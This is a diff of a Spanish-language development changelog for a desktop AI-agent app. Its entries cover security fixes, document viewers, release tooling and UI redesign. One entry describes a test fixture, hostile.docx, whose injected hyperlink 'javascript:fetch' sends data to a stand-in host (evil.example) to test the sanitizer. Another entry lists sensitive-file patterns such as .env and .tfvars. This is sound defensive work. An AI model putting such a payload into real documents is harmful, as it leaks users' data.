@@ -845,15 +845,17 @@ Cambio de seguridad. Plan: `scratchpad/plan-remoto-reconexion.md`; auditoría: h
 ## F8-B67: arreglos de seguridad de la auditoría del control remoto
 
 Corrige los hallazgos 1, 5, 7, 9, 10 y 12 de la auditoría del remoto v3 (el 2 —aprobar `bash`/`edit` «una vez» desde el celular— queda a decisión del dueño; 3, 6, 8 y 11 pendientes). Cada arreglo tiene una prueba que reproduce el ataque y fallaba antes (comprobado revirtiendo el código).
+
 - **1**: el filtro de archivos sensibles cubre `tasks:previewFile`, `git:diff` (con `path` y filtrando la respuesta por bloques), `GET /vcs/diff`, `/vcs/diff/raw`, `/session/{id}/diff`, `/file/status`, `summary.diffs` y el evento `session.diff` (`diff-filter.ts`); lista ampliada con `.envrc`, `.env-*`, `.env_*`, `*.tfvars`, `.vault*`. Pruebas: `engine-proxy.test.ts`, `diff-filter.test.ts`, `path-guard.test.ts`.
 - **5**: los diálogos muestran `patrones`, comando/rutas del permiso, reglas de sesión, prompt y horario de rutinas y contenido de AGENTS.md/memoria, con tope de 240 caracteres y 12 líneas, sin saltos ni secretos (`confirm-detail.ts`, también en `ConfirmQueue`). Pruebas: `policy.test.ts`, `confirm-queue.test.ts`, `engine-proxy.test.ts`.
 - **9**: `settings:get`, `tasks:trusted:list` y `tasks:policy` salen sin `opencodeBin` ni rutas fuera del ámbito (`sanitizeResult` con predicado de ámbito).
 - **10**: `git:createWorktree` pasa a X; `routines:delete/toggle(off)`, `tasks:tasks:forget` y `tasks:restore:forget` se acotan al ámbito; toda acción M ejecutada deja `action-run` (canal y clase) en `remote-audit.jsonl` (i18n es/en de la actividad).
 - **7**: una llamada D idéntica a otra pendiente responde `busy` (una aprobación, una ejecución) y el digest se compara con el de lo que de verdad se ejecuta (IPC: payload validado en `authorize`, de un solo uso; HTTP: lo enviado al motor frente a una copia tomada al confirmar).
 - **12**: `docs/SEGURIDAD.md` (§3 vicies marcada como histórica y corregida, nueva §3 tricies bis) y `docs/REMOTO-FASE2.md` (el secreto está en `localStorage`).
-Pendiente: `src/test/opencode-contract.test.ts` falla en este árbol por la instantánea de `api-routes.json` (ajena a esta tanda); prueba manual de los diálogos nuevos en el Mac.
+  Pendiente: `src/test/opencode-contract.test.ts` falla en este árbol por la instantánea de `api-routes.json` (ajena a esta tanda); prueba manual de los diálogos nuevos en el Mac.
 
 ## F8-B68: seguridad del navegador integrado y de «Abrir en el editor»
+
 - **SSRF local**: `isLoopbackOrPrivateHost` clasifica por la IP real (`ip-class.ts`: IPv6 mapeada/NAT64/6to4, ULA, link-local, 0.0.0.0/8, CGNAT, multicast, metadatos de nube, `*.localhost`) y `webRequest` bloquea nombres que resuelven a IP local (anti-rebinding, salvo origen «siempre»).
 - **Puerta de aprobación**: `window.open`/`target=_blank` pasan por `resolveNavigationApproval`; el bypass pasa de «por pestaña, 2 s/toda la carga» a URL exacta y un solo uso (`nav-bypass.ts`), así que las redirecciones a otro destino vuelven a pasar por la puerta.
 - **`clipboard-sanitized-write`** solo para el origen https (o http local) de la página de nivel superior.
@@ -861,6 +863,7 @@ Pendiente: `src/test/opencode-contract.test.ts` falla en este árbol por la inst
 - Pruebas: `session.test.ts`, `nav-bypass.test.ts`, `dialog/service.test.ts`. Detalle y límites (TOCTOU de DNS) en `docs/SEGURIDAD.md` §3 tricies ter. Pendiente: prueba manual en la app (redirección y `window.open` con el agente).
 
 ## F8-B69: seguridad de Tareas, MCP y credenciales (6 hallazgos de la revisión externa)
+
 - **5**: `mcp:getConfig` y las respuestas/eventos de cambios de MCP entregan `headers`/`environment` enmascarados; `mcp:save` restituye el secreto guardado si el valor llega enmascarado.
 - **6**: el token del MCP del navegador se revoca al terminar el servidor de Tareas (y un relanzamiento invalida el anterior). Los tokens siguen en el entorno de `opencode serve`: pendiente denegar `process-info` en Seatbelt o un proxy MCP (no se tocó `sandbox*`).
 - **7**: `tasks/host-rules.ts` valida `setHost(allow)` y `allowOnce` (sin TLD, sufijos públicos, comodines amplios ni IP privadas).
@@ -872,12 +875,13 @@ Pendiente: `src/test/opencode-contract.test.ts` falla en este árbol por la inst
 ## F8-B70: preparación de publicación sin credenciales (columna A del plan)
 
 Todo lo que se podía dejar listo sin certificados, claves ni repositorio; nada empaquetado, notarizado ni subido. Pruebas: `npm run test:release-scripts` (node:test con dobles) y vitest en `src/main/update`.
+
 - **Firma** (`build/sign-common.js`, `notarize.js`, `notarize-dmg.js`, `electron-builder.js`): notarización con clave API (`APPLE_API_KEY` ruta del `.p8` + `APPLE_API_KEY_ID` + `APPLE_API_ISSUER`, prioritaria) o Apple ID; credenciales a medias fallan nombrando lo que falta; el `.dmg` se notariza y graba con `notarytool` + `stapler` (hook `afterAllArtifactBuild`; la contraseña de app viaja como `@env:`); con Developer ID los helpers `cu-helper` y `onyxcode-disclaim` se vuelven a firmar con `HELPER_ID`/`DISCLAIM_ID` + hardened runtime antes de notarizar (el camino autofirmado conserva sus argumentos exactos). Con `CSC_LINK` hace falta además `CSC_NAME`. Pruebas: `scripts/release-build.test.mjs`.
 - **`npm run verify:signed`** (`scripts/verify-signed.mjs`, `--expect adhoc|self|devid`, `--dry-run`): codesign, identificadores, runtime, `spctl` y `stapler`. Contra el `dist/` actual detecta que `cu-helper` y `onyxcode-disclaim` llevan identificador derivado (build anterior al gancho).
 - **Actualizador** (`src/main/update`): `UPDATE_TEAM_ID` en `config.ts` (vacío = sin cambio; con valor, `codesign -R` del equipo y falla cerrado si está mal formado; en `src/shared/brand.ts` no se tocó), `updateKeys` extra en `resolveInstallConfig` (rotación), canal beta como lógica pura (`channel.ts`, `UpdateChecker({channel})`, sin interfaz) y publicación en dos pasos: `publish-update.mjs --manifest-only` + `scripts/sign-update.mjs` (comprueba tamaño/SHA-256/appId/keyId/clave y firma en el Mac del dueño). Pruebas: `manifest-two-step`, `installer-team`, `channel`, `checker`.
 - **CI** (`.github/workflows`): `ci.yml` sin secretos ni E2E; `release.yml` solo crea un BORRADOR, con entorno `release` de aprobación manual, permisos mínimos y acciones fijadas por SHA; la clave Ed25519 no está. Guardias en `scripts/workflows.test.mjs`.
 - **Docs y avisos**: `docs/RELEASE.md` (checklist, rollback siempre hacia delante, rotación de claves y de certificado), `docs/DISTRIBUCION.md` (clave API, `.dmg`, `verify:signed`, SmartScreen/Windows), `CHANGELOG.md` + `scripts/release-notes.mjs` (cuerpo de la release), `scripts/rename-app.mjs --dry-run` (solo simula) y `THIRD_PARTY_NOTICES.md` alineado con `LICENSE` (MIT) con la comprobación en `verify:release` (que además dejó de dar un falso positivo con `swap.sh`).
-Pendiente: lista de claves en `brand.ts` y su cableado en `ipc/update.ts`, `validateManifest` con prereleases y la opción de Ajustes del canal beta (fuera del alcance de esta tanda: `src/shared`, `src/main/ipc`, interfaz); confirmación de licencia y nombre por el dueño; todos los pasos de la columna B.
+  Pendiente: lista de claves en `brand.ts` y su cableado en `ipc/update.ts`, `validateManifest` con prereleases y la opción de Ajustes del canal beta (fuera del alcance de esta tanda: `src/shared`, `src/main/ipc`, interfaz); confirmación de licencia y nombre por el dueño; todos los pasos de la columna B.
 
 ## F8-B71: elegir un elemento del navegador y enviarlo al chat (lado main, `PickedElement` v2)
 
@@ -981,6 +985,7 @@ Pendiente: lista de claves en `brand.ts` y su cableado en `ipc/update.ts`, `vali
 - Tamaños (gzip KB): arranque 345,1 → 284,6 (tope 300); `boot.js` 261,7 → 201,3 (tope 210); JS min de arranque ~ 910 → 756 KB (tope 780); `index.js` 41,4, `main.js` 22,1 y `boot.css` 18,9 sin cambios. No se subió ningún presupuesto. Margen justo: `boot.js` min 688,8 / 690.
 
 ## F8-B81: Tareas en Windows (WSL2), preparación sin activar y Seatbelt extraído a un backend (T-W1 a T-W3, parte de la Mac)
+
 - Qué: `src/main/tasks/backends/` con la interfaz `SandboxBackend` (`types.ts`), Seatbelt extraído sin cambios (`seatbelt.ts`, `none.ts`, `spawn.ts`, `selectBackend`) y `startTasksServer` delegando en él; `platform-caps` con `tasksSandbox` (`seatbelt`/`wsl`/`none`) y la bandera de producto `tasksWin` (apagada: Windows sigue sin Tareas); módulos puros del backend WSL (`wsl-paths`, `wsl-spec`, `bridge-protocol`, `wsl-status`), `WslBridgeHost` y `WslBackend` con `wsl.exe` simulado (NO enlazado en producción); lanzador de Python con Landlock como recurso (`resources/wsl/`, excluido del `.asar`). Documentación: `docs/WINDOWS-TAREAS.md` y `docs/SEGURIDAD.md` §3 tricies octies.
 - Autorización del dueño para tocar `sandbox*`, `proxy*` y `provider-egress` solo para la extracción: `sandbox-profile.ts`, `proxy.ts`, `proxy-policy.ts` y `provider-egress.ts` no cambian; `sandbox.ts` solo delega el lanzamiento.
 - Prueba de equivalencia: `sandbox.equivalence.test.ts` contra `__fixtures__/seatbelt-before.json`, capturado con el código anterior en commits previos (`baeb0bd`, `c70fbdb`): 9 perfiles SBPL idénticos byte a byte y 4 lanzamientos completos con el mismo `command`, `args`, `env`, opciones de `spawn`, proxies, `trackPid`/`killTree` y limpieza. Los tests existentes de `src/main/tasks` y `src/main/ipc` pasan sin editar ni regenerar ningún snapshot. Ver nota: durante la captura se vio que el valor aleatorio del centinela dependía del ORDEN de las llamadas a `randomBytes`; el doble ahora es determinista por tamaño y el «antes» se recapturó con el `sandbox.ts` original.
@@ -1056,6 +1061,7 @@ Herramientas: `scripts/shot-diff.mjs` (comparador de píxeles), `shot-desktop`: 
 Celular: 29 de 32 capturas idénticas; las 3 restantes (`lista-*`) difieren solo en el texto de hora relativa («hace 23 h» → «ayer»), no en CSS.
 
 ## F8-B93 — Rediseño de escritorio: Tareas, Rutinas, Ajustes, primer uso y Comparar (defectos de lógica L1–L6; sin cambio en el celular)
+
 **Lógica.** L1/L2: «Activas» pasa a **«En otras carpetas»** (`activeElsewhere`) y la carpeta abierta tiene su grupo **«En curso»** con el estado del
 renderer (`splitInProgress`), excluido de los grupos por fecha: una tarea nunca sale dos veces y la que espera aprobación aparece al instante
 (`sidebar-groups.test.ts`). L3: la barra de aprobación solo se pinta si la tarjeta grande no se ve ≥60 % (`IntersectionObserver`; cierre seguro con
@@ -1103,6 +1109,7 @@ sumar `--header-inset`; la fila buscador+filtros de Tareas es del agente de Tare
 ## F8-B92 — Rediseño de escritorio: conversación y Code (T1–T6, sin cambio en el celular)
 
 Todo bajo `desk:` / `app/desktop/conversation.css` (`:root[data-shell='desktop']`); ninguna clase compartida se quitó ni se sustituyó, ninguna regla `.markdown` de `globals.css` se editó y no hay colores nuevos.
+
 - **T1 defectos**: `UsageMeter` ya no parece un cargador (sin turnos del asistente no se pinta; anillo de 16 px con pista `--border`, arco solo con ≥1 %, extremos `butt`, y el `N %` al lado; el celular conserva su anillo); Enviar/Detener de Code `desk:shrink-0` (ya no se aplasta con el panel abierto) y con `aria-label`; adjuntar/mencionar con `aria-label`; cabecera de Code que encoge por prioridad (título > rama > proyecto, sin los 192 px fijos); degradado de 24 px sobre el compositor con `desk:before:` (CSS, cero coste por token).
 - **T2 Markdown**: 15/24, encabezados en `--font-title`, código en línea sin borde, cita gris, casillas propias sin viñeta, cabecera de bloque de código sin franja, 13/20 en el código, tabla 14/20.
 - **T3**: columna de 720 px (mensajes, compositores y avisos), ritmo de 24 px, burbuja del usuario plana de 16 px, acciones por mensaje de 28 px que flotan en el hueco (no abren vacío), un solo «pensando» (sin tres puntos; Code usa `ThinkingIndicator`) y un solo razonamiento (Code de escritorio usa el aspecto de Chat; contenido con `max-h-80`), «Build» ya no se pinta bajo cada mensaje (solo la insignia `Plan`), el historial de Chat ya no anima al abrirse.
@@ -1121,12 +1128,14 @@ Todo bajo `desk:` / `app/desktop/conversation.css` (`:root[data-shell='desktop']
 - **Defectos**: cabeceras de Code, Tareas, Comparar y Ajustes sin `--header-inset` (el botón de la barra colapsada pisaba el título): arreglado con `desk:pl-[calc(var(--header-inset,0px)+N px)]`. Sin arreglar (menores): selector «Agrupar: por fecha» de Tareas recortado en la barra lateral; `UsageMeter` muestra «0 %» junto a Detener en Tareas (datos falsos sin tokens; con turnos reales y contexto nulo se vería igual); la cabecera de Chat centrada sigue sin inset (solo roza con ventanas muy estrechas).
 
 ## F8-B95 — Cierre del rediseño de escritorio
+
 - **Selector «Agrupar: por fecha»** (Tareas): en escritorio la etiqueta «Agrupar:» pasa a `desk:sr-only` (sigue siendo la etiqueta accesible) y el selector gana `desk:pl-2.5`; «por fecha» se lee entera junto a «Archivadas».
 - **UsageMeter**: en escritorio no se pinta sin turnos, sin contexto o con un uso que redondea a 0 % (ya no hay aro vacío con «0 %» en Chat/Tareas); el celular no cambia. Prueba actualizada.
 - **Icono de Tareas en el celular**: `MobileShell` vuelve a `Users` (escritorio sigue con `ListChecks`).
 - **Verificación**: vitest renderer+test 1191 pasan, typecheck, lint (0 errores), format:check, build:pwa + size:pwa en verde (arranque 285,4 KB gz; budget.json intacto); captura tareas-lista revisada.
 
 ## F8-B96 — Piloto del rediseño de Claude Design (escritorio): barra lateral, inicio del chat, conversación y compositor
+
 - **Barra lateral** (`app/Sidebar.tsx`, `ChatSessionList`, `desktop/shell.css`): 256 px sin borde (separada por tono `bg-sidebar`), filas de 32 px con 8 px de relleno y texto 14/20, fila activa con relleno de hover + peso 500 + icono de acento (sin la barrita de acento del historial), etiquetas de grupo en frase 11/16 de 28 px.
 - **Inicio del chat vacío** (`ChatView`, `ChatComposer`): saludo 32/40 en la fuente de títulos, compositor flotante de 720 px (radio 20, alto mínimo 128, sin borde, `shadow-md`) y cuatro tarjetas de sugerencia en rejilla de 4 columnas (radio 12, `shadow-sm`, sin borde, icono en tile de 32 px + título + descripción nueva `chat.suggest.*.desc`; la quinta sugerencia «Traducir» sigue en el celular, no en la rejilla de escritorio). Sin logo ni halo.
 - **Conversación y compositor inferior**: columna de lectura de 720 px reales (`measure-prose` + 48 de relleno), turnos a 32 px, bloques de la respuesta a 16 px (también en Markdown), burbuja del usuario con `bg-hover` radio 16 (78 %), compositor inferior radio 16 con `shadow-md`, nota 12/16 debajo.
@@ -1331,7 +1340,7 @@ Prueba: documentación; `npx vitest run src/test` (guardias de texto).
   de confirmación por la herramienta `question`, pero sin pasar por la app ni por los filtros de secretos).
 - **El agente ya no escribe la skill.** Los dos prompts (`CREATE_SKILL_PROMPT` en `transcript.ts` y
   `buildRecordedSkillPrompt` en `skill-recording.ts`) ahora piden terminar el turno con un bloque
-  ```lazunox-skill``` ({name, description, body}, agentskills.io). `SkillProposalCard` lo muestra editable
+  `lazunox-skill` ({name, description, body}, agentskills.io). `SkillProposalCard` lo muestra editable
   (nombre, descripción, contenido) bajo el último mensaje; solo al pulsar «Guardar skill» se llama a
   `tasks:skill:accept` y `main` escribe. `src/shared/skill-proposal.ts` (extracción + filtros, puro) y
   `src/main/tasks/learned-skills.ts` (escritura, revalida todo, nunca sobrescribe una skill existente: el
@@ -1342,3 +1351,2030 @@ Prueba: documentación; `npx vitest run src/test` (guardias de texto).
 - **Pendiente**: detectar skills que queden escritas en `.opencode/skills/` sin pasar por esta tarjeta
   (ediciones manuales o de una versión anterior) y ofrecer revisarlas; memoria/skills desde Rutinas; memoria
   para modo Code. Nada de esto se tocó en este commit.
+
+## F8-B114 — Memoria/skills desde Rutinas: cola de pendientes de revisar (y un fix de seguridad)
+
+- **Fix de seguridad, no un detalle visual**: `perform()` del planificador guardaba el texto final de la
+  rutina (incluyendo el bloque crudo ` ```lazunox-memoria``` `/` ```lazunox-skill``` ` si lo había) en
+  `record.summary`, que llega a `routines.json`, la notificación nativa, el historial (Markdown) y el evento
+  `routines:run` — que es `allow` en `CELULAR_EVENTS` y por lo tanto **llegaba al celular**. Ahora el bloque se
+  quita SIEMPRE del resumen, en los tres modos (chat/code/tasks), proponga memoria o no.
+- **Antes**: una rutina (ejecución desatendida, nadie mirando) tenía prohibido proponer memoria nueva. **Ahora**:
+  en modo Tareas, con «Aprender de las tareas» encendido, sí puede proponer — pero en vez de una tarjeta que
+  nadie vería, queda en una cola de pendientes (`userData/memoria/pendientes.json`, hasta 30 ítems, FIFO:
+  los más viejos se descartan si se llena) para revisar cuando el dueño vuelva a abrir la app. Chat/Code
+  nunca tuvieron esta sección del prompt (`learningSupported: false` para esos modos).
+  `src/shared/learned-pending.ts` (cola, puro) + `src/main/tasks/learned-pending.ts` (lectura/escritura,
+  dedup contra lo ya guardado y lo ya pendiente, revalida la carpeta igual que cualquier aprobación).
+  Un ítem puede traer memoria Y skill a la vez (si el prompt de la rutina pedía las dos cosas en el mismo
+  turno): se aprueban o descartan por separado (`resolvePart`), sin perder la otra mitad.
+- **UI**: `PendingLearnedReview` arriba de la lista en Rutinas (reutiliza `LearnedProposalList` y
+  `SkillProposalFields`, extraídos de `MemoryProposalCard`/`SkillProposalCard` sin cambiarles el
+  comportamiento); aviso "N pendientes · Revisar" en Ajustes › General; si la misma propuesta ya está en la
+  tarjeta en vivo de una tarea Y en la cola de pendientes (la rutina reutilizó esa sesión), la tarjeta en vivo
+  se oculta para no duplicar la revisión.
+- IPC nuevo `tasks:learn:pending:{list,acceptMemory,acceptSkill,discard,discardAll,ackDropped}` + evento
+  `tasks:learn:pending:changed`, todo clase `X`/`deny` en el control remoto (nunca al celular).
+  `resources/opencode/agents/tasks.md` corregido de paso: "Crear skill de esta tarea" nunca permitía que el
+  agente escribiera el archivo él mismo, pero la instrucción se podía leer como una excepción — ahora es
+  explícita.
+- Pruebas nuevas: `learned-pending.test.ts` (18 en `shared`, 17 en `main`), `service.learning.test.ts` (3,
+  verifica con un cliente OpenCode simulado que el resumen real de `perform()` nunca lleva el bloque crudo),
+  `tasks-prompt.test.ts` ampliado. Batería completa: 6083 pruebas verdes (23 omitidas, solo-Windows),
+  typecheck limpio (node/web), paridad es/en de i18n verificada.
+- **Pendiente**: memoria para modo Code (Parte B del plan: prompt global compartido, sin alcance de proyecto
+  en v1, requiere una prueba manual con el motor real para confirmar que `system` llega al modelo). Nada de
+  esto se tocó en este commit.
+
+## F8-B115 — Memoria aprendida en Code (Parte B): primera versión, solo memoria global
+
+- **Mismo almacén que Tareas, pero solo alcance `usuario`.** Code no tiene el concepto de carpeta aprobada
+  de Tareas, así que no hay dónde validar una memoria "de este proyecto" todavía: cualquier propuesta
+  `alcance: 'proyecto'` se descarta antes de mostrarla (`CodeMemoryProposalCard`, `src/shared/code-prompt.ts`).
+  Reutiliza el interruptor `learningEnabled` (Ajustes), ahora con texto que menciona Tareas y Code.
+- **El `system` nunca se manda desde el celular.** `PROMPT_KEYS` en `remote/policy.ts` no incluye `system`:
+  si el celular armara uno igual con su copia local de la memoria/ajustes, sería una forma de colar
+  instrucciones con el peso de "sistema" sin pasar por la aprobación del dueño en el Mac/PC. `doSend`
+  (`features/code/impl/store.ts`) solo construye `system` con `!isRemoteSurface()`; verificado con un cliente
+  simulado (`store.system-prompt.test.ts`), no con el motor real (ver pendiente).
+- **Refactor de paso, sin cambiar comportamiento**: `lastAssistantEntry`/`lastAssistantText` (antes en
+  `tasks/impl/EscalateCard.tsx`/`transcript.ts`) se movieron a `lib/conversation/entries.ts` (puro,
+  compartido), re-exportadas desde ambos archivos para no romper a quien las importaba de ahí. Code las usa
+  directo, sin importar de `tasks/impl`.
+- El bloque ` ```lazunox-memoria``` ` se quita de los mensajes de Code igual que en Tareas
+  (`MessageStream.tsx`/`buildBlocks`): es un contrato con el agente, no texto para leer.
+- Pruebas nuevas: `code-prompt.test.ts` (4), `CodeMemoryProposalCard.test.ts` (4, incluye el filtro de
+  `alcance: 'proyecto'`), `learned-memory-store.test.ts` (6), `store.system-prompt.test.ts` (3, verifica que
+  el `system` lleva la memoria con el aprendizaje encendido, el aviso con el aprendizaje apagado, y que
+  nunca se manda desde el celular). Batería completa: 6100 pruebas verdes (23 omitidas, solo-Windows),
+  typecheck limpio (node/web), lint y formato sin errores.
+- **No verificado**: que el `system` realmente llegue al modelo a través del motor real (esta batería solo
+  verifica el payload que construye el renderer, con un cliente simulado) — falta una prueba manual con el
+  motor conectado. Tampoco se tocó la Parte de Rutinas en modo Code (las rutinas en modo `code`/`chat` nunca
+  tuvieron la sección de memoria del prompt, ver F8-B114).
+
+## F8-B116 — Visor de documentos: base aislada (Fase 0 del plan maestro)
+
+- **Función nueva**: en modo Tareas, PDF/Word/Excel/PowerPoint se abren DENTRO de la app con calidad real
+  (no un hueco al visor del sistema). Arquitectura de aislamiento calcada del patrón ya existente de
+  `src/main/extras/artifact-window.ts`.
+- **Esquema privilegiado nuevo** `lazunox-viewer://` en `src/main/security/app-protocol.ts` (D1, zona
+  intocable: solo se añadió una entrada a la llamada ya existente de `registerSchemesAsPrivileged`, que
+  solo puede invocarse una vez por proceso; `RENDERER_CSP` y `handleAppScheme` sin tocar).
+- **Módulo nuevo `src/main/viewer/`**: `session.ts` (sesión aislada, partición en memoria `doc-viewer`,
+  sin persistencia, `webRequest` cancela todo lo que no sea el propio esquema, permisos denegados,
+  descargas bloqueadas); `scheme.ts` (sirve `lazunox-viewer://viewer/…`: estáticos del visor y
+  `/doc/<token>`, que **revalida la carpeta aprobada cada vez que sirve bytes**, nunca confía en la
+  validación que hizo la apertura); `tokens.ts` (token aleatorio de 256 bits, uno solo activo a la vez, se
+  revoca al abrir otro); `doc-kind.ts` (detecta el tipo por extensión + bytes mágicos `%PDF-`/`PK\x03\x04`,
+  con topes de tamaño por tipo); `view.ts` (ciclo de vida de una `WebContentsView` sandboxeada sin preload,
+  navegación y ventanas emergentes bloqueadas con `will-navigate`/`will-redirect`/`will-attach-webview`/
+  `setWindowOpenHandler`).
+- **IPC nuevo** `src/main/ipc/tasks-viewer-handlers.ts`: canales `tasks:viewer:open/attach/close` + evento
+  `tasks:viewer:event`, todo clase `'X'` en `src/main/remote/policy.ts` (máxima restricción: es una vista
+  nativa de la ventana del Mac que lee bytes de cualquier archivo autorizado).
+- **Capacidad nueva** `docViewer` en `src/shared/platform-caps.ts` (`true` en Mac/Windows con Tareas,
+  `false` en remoto).
+- **UI**: pestaña «Documento» nueva en el panel lateral de Tareas (`TasksWorkspace.tsx`), con hook propio
+  `useViewerViewport.ts` y panel `DocumentViewerPanel.tsx`; `Deliverables.tsx` ahora abre pdf/docx/xlsx/pptx
+  en el visor nuevo en vez del `PreviewDialog` viejo cuando `platformCaps().docViewer` es verdad.
+- **Build propio**: `src/viewer/` (React aparte) con `vite.viewer.config.ts`/`tsconfig.viewer.json`, salida
+  en `out/viewer/`, servida SOLO por el esquema nuevo (nunca por el esquema de la app principal).
+- i18n: `src/shared/i18n/{es,en}/viewer.ts` + claves `merr.viewer.*`.
+- **Verificado**: typecheck node/web/viewer limpio; batería completa de vitest en el VPS de CI aislado (no
+  en el Mac, por la regla de carga del equipo), ~6176 pruebas, sin regresiones reales (dos fallos
+  «conocidos»: uno es el flaky documentado por contención de CPU, el otro un artefacto de sincronización
+  del VPS, no del código).
+- **Pendiente**: falta un «spike» a mano, con la app real corriendo, de que un module worker carga bien
+  desde el esquema nuevo — eso no se puede verificar desde el entorno del agente, queda para el dueño.
+
+## F8-B117 — Visor de PDF con PDF.js (Fase 1)
+
+- Paquete `pdfjs-dist@^6.4.299` (Apache-2.0, cero dependencias transitivas). `src/viewer/pdf/PdfViewer.tsx`
+  nuevo, usando `PDFViewer`/`EventBus`/`PDFLinkService`/`PDFFindController` de
+  `pdfjs-dist/web/pdf_viewer.mjs`: carga perezosa de páginas, zoom (50–400%, pasos fijos en el módulo puro
+  nuevo `src/viewer/zoom.ts`), navegación de páginas, buscar.
+- El worker de pdf.js y sus assets binarios (cmaps, fuentes estándar, wasm, perfiles de color,
+  decodificadores de imagen, ~4.5 MB) se copian al build con un script nuevo
+  `scripts/copy-pdfjs-assets.mjs`, encadenado en `npm run build:viewer`.
+- Enlaces externos de un PDF quedan inertes: bloqueados por `view.ts` de la F0 (defensa ya existente, no
+  hizo falta tocar nada nuevo).
+- **Pruebas nuevas** para cerrar un hueco que había quedado pendiente de la F0: `src/main/viewer/
+scheme.test.ts` (7: token válido sirve bytes con headers correctos; token inventado o revocado → 404; la
+  carpeta deja de ser válida al servir aunque el token siga activo → 404; archivo más grande que el tope →
+  413; método distinto de GET → 404; host distinto → 404; ruta con «..» → 404); `src/main/viewer/
+session.test.ts` (4: solo el esquema propio pasa por `webRequest`, cualquier otro destino se cancela,
+  permisos y descargas bloqueados); `src/main/viewer/view.test.ts` (4: will-navigate/will-redirect/
+  will-attach-webview prevenidos, window.open negado, el rect de `attach()` se aplica escalado por zoom,
+  Escape se reenvía como evento). Más `src/viewer/zoom.test.ts` (9).
+- **Verificado**: build de producción del visor genera el worker y copia los assets correctamente; batería
+  completa en el VPS sin regresiones reales.
+
+## F8-B118 — Visor de Word con docx-preview (Fase 2)
+
+- Paquete `docx-preview@^0.4.1` (Apache-2.0) + su dependencia `jszip`. `src/viewer/docx/DocxViewer.tsx`
+  nuevo: pide el documento por `fetch` al esquema del visor, renderiza con `renderAsync` (`useBase64URL:
+true` para que las imágenes queden embebidas sin depender de `blob:` en la CSP; páginas separadas,
+  encabezados/pies/notas al pie y al final activados).
+- **Segunda capa de defensa** después del render (la primera es la CSP del visor, que ya bloquea toda red
+  saliente salvo el propio esquema): `src/viewer/docx/sanitize.ts` (`sanitizeDocxDom`) corre sobre el DOM
+  ya renderizado asumiendo que el documento es hostil — deja todo `<a>` inerte (sin `href`, sin importar a
+  dónde apunte), saca `src`/`poster`/`srcset`/etc. que no sean `data:`, elimina `<script>`/`<iframe>`/
+  `<object>`/`<embed>`/`<link>`/`<meta>`/`<form>` del árbol, saca atributos `on*`, limpia `url(http://…)`
+  dentro de `style` inline y de bloques `<style>` del propio documento (deja `url(data:…)` intacto). 10
+  pruebas unitarias con `happy-dom` (devDependency nueva) cubren cada caso, incluida la idempotencia.
+- **Tipografías sustitutas empaquetadas** (decisión D9 del plan maestro, para que un .docx se vea igual en
+  Mac y Windows sin tener Office instalado): Carlito↔Calibri y Caladea↔Cambria (`@fontsource/carlito`/
+  `@fontsource/caladea`, OFL-1.1) y Liberation Sans↔Arial, Liberation Serif↔Times New Roman
+  (`@typopro/web-liberation`, OFL-1.1). Declaradas con `@font-face` en `src/viewer/styles.css` con
+  `local()` primero (si el sistema tiene la original de Microsoft, la usa). Script nuevo
+  `scripts/copy-docx-fonts.mjs` las copia a `out/viewer/assets/fonts/`, al lado del CSS compilado (los
+  `url()` de CSS se resuelven relativos al propio archivo CSS, a diferencia de las rutas de pdf.js que son
+  relativas a la página). Licencias documentadas en `THIRD_PARTY_NOTICES.md`.
+- Fixtures nuevas en `src/viewer/__fixtures__/`: `sample.docx` (generado con la skill `docx` existente) y
+  `hostile.docx` (el mismo documento con un hipervínculo externo
+  `javascript:fetch('http://evil.example/leak')` inyectado a mano para probar el saneado). Prueba de
+  extremo a extremo `src/viewer/docx/fixtures.test.ts` (3): pasa ambos fixtures por el renderizador REAL de
+  `docx-preview` (bajo **jsdom**, no happy-dom: se comprobó que `docx-preview` no renderiza ningún hijo
+  dentro de `<article>` bajo happy-dom, ni con un .docx real de Word, es una limitación de esa
+  implementación de DOM) y confirma que el hipervínculo hostil llega vivo al DOM antes de sanear y
+  desaparece del todo después.
+- **Verificado**: build de producción genera las fuentes correctamente; 10/10 pruebas de saneado (unidad,
+  happy-dom) + 3/3 de extremo a extremo (jsdom) pasan.
+
+## F8-B119 — Visor de Excel con SheetJS CE (Fase 3a del plan maestro)
+
+- **`xlsx` (SheetJS Community Edition) vendorizado, NO desde el registro de npm**: la versión publicada
+  en npm sigue con los CVE-2023-30533/CVE-2024-22363; la que los corrige, v0.20.3, solo está en
+  `cdn.sheetjs.com`. Se descargó el tgz oficial y se guardó tal cual en `vendor/sheetjs/` (versionado en
+  git); `package.json` apunta ahí con `file:`. `src/test/vendor-sheetjs.test.ts` (3) falla si alguien
+  cambia esto a una versión del registro, si el lockfile deja de resolver contra el archivo local, o si
+  el tgz se corrompe/reemplaza (compara el sha256, documentado en `docs/VENDOR-SHEETJS.md`).
+- **Parseo en un Worker nuevo** (`src/viewer/xlsx/worker.ts`), fuera del hilo principal de la vista
+  aislada: un libro de 100k filas no debe trabar el toolbar ni el scroll mientras se lee.
+  `sheetRows: 10000` le pone un tope DURO a SheetJS — no solo a cuántas filas se muestran, a cuántas
+  lee — así que un libro más grande se recorta solo, nunca se intenta leer entero.
+- **Conversor libro → modelo de grilla**, módulo puro nuevo `src/viewer/xlsx/model.ts`
+  (`workbookToGrid`/`sheetToGrid`): texto ya formateado por SheetJS (`w`), fórmula aparte para el
+  tooltip, celdas combinadas (con solo la esquina superior izquierda "sin cubrir"), relleno sólido
+  resuelto a color css, anchos/altos de `!cols`/`!rows` con valores por defecto si faltan. **El tamaño
+  del modelo sale SIEMPRE de `!data.length` (lo que SheetJS realmente leyó), nunca del rango declarado
+  en `!ref`**: un xlsx hostil puede declarar `!ref: "A1:ZZZ1048576"` con casi ninguna celda real, y
+  reservar memoria para lo declarado sería una bomba de memoria barata. 10 pruebas unitarias, incluida
+  justo esa: un `!ref` gigante con una sola celda real no tarda ni reserva de más.
+- **Grilla virtualizada verticalmente**, módulo puro nuevo `src/viewer/xlsx/virtualize.ts`
+  (`visibleRowRange`): con 100.000 filas de alto variable, calcula con búsqueda binaria (no lineal) qué
+  rango hay que pintar para un `scrollTop`/alto de viewport dados, con margen de overscan. 9 pruebas,
+  incluida una con 100k filas que confirma que sigue siendo instantáneo.
+- **UI** nueva `src/viewer/xlsx/XlsxViewer.tsx`: pestañas por hoja, cabeceras de columna (A, B, …, AA…)
+  y de fila fijas (`position: sticky`), buscar (salta a la primera coincidencia, cuenta cuántas hay),
+  aviso de "N+" filas cuando el libro se recortó por el tope del Worker. Nunca ejecuta una fórmula ni
+  sigue un hipervínculo del libro — solo pinta el texto que SheetJS ya calculó.
